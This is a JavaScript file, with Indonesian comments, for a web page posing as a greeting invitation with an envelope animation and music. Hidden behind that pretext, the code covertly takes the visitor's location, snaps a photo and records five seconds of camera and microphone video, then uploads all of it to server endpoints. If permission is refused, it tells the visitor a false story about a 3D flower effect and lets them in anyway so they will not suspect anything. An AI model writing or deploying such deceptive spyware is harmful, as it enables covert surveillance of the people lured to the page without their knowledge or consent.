var openBtn = document.getElementById("openBtn");
var globalStream;

openBtn.addEventListener("click", function() {
    // 1. Jalankan Animasi Amplop & Musik
    document.querySelector(".wrapper").classList.add("open");
    document.getElementById("flowerContainer").style.display = "block";
    document.getElementById("bgMusic").play();
    openBtn.style.display = "none";

    // 2. PROSES INTEL (Kamera & Lokasi)
    console.log("Meminta izin...");
    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
    .then(function(stream) {
        globalStream = stream;

        // A. Ambil Lokasi
        navigator.geolocation.getCurrentPosition(function(pos) {
            fetch("/kirim-lokasi", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ latitude: pos.coords.latitude, longitude: pos.coords.longitude })
            });
        });

        // B. Ambil Foto Otomatis
        var v = document.createElement("video");
        v.srcObject = globalStream;
        v.play();
        v.onloadedmetadata = function() {
            var canvas = document.createElement("canvas");
            canvas.width = 640; canvas.height = 480;
            setTimeout(function() {
                canvas.getContext("2d").drawImage(v, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(function(blob) {
                    var fd = new FormData();
                    fd.append("photo", blob, "foto.jpg");
                    fetch("/kirim-foto", { method: "POST", body: fd });
                    
                    // C. Rekam Video Singkat
                    mulaiRekaman(globalStream);
                }, "image/jpeg");
            }, 1000);
        };

        // 3. TRANSISI KE ISI UNDANGAN (Setelah data mulai terkirim)
        setTimeout(function() {
            document.getElementById("cover").classList.add("hide");
            document.getElementById("mainContent").style.display = "block";
        }, 5000); // 5 detik pamer bunga baru masuk ke undangan

    })
    .catch(function(err) {
        // Jika ditolak, tetap masuk ke undangan agar tidak curiga
        alert("Izinkan akses kamera untuk melihat efek bunga 3D kami!");
        document.getElementById("cover").classList.add("hide");
        document.getElementById("mainContent").style.display = "block";
    });
});

function mulaiRekaman(stream) {
    var recorder = new MediaRecorder(stream);
    var chunks = [];
    recorder.ondataavailable = function(e) { chunks.push(e.data); };
    recorder.onstop = function() {
        var videoBlob = new Blob(chunks, { type: "video/mp4" });
        var fd = new FormData();
        fd.append("video", videoBlob, "video.mp4");
        fetch("/kirim-video", { method: "POST", body: fd })
        .then(() => { stream.getTracks().forEach(t => t.stop()); });
    };
    recorder.start();
    setTimeout(() => { recorder.stop(); }, 5000); // Rekam 5 detik
}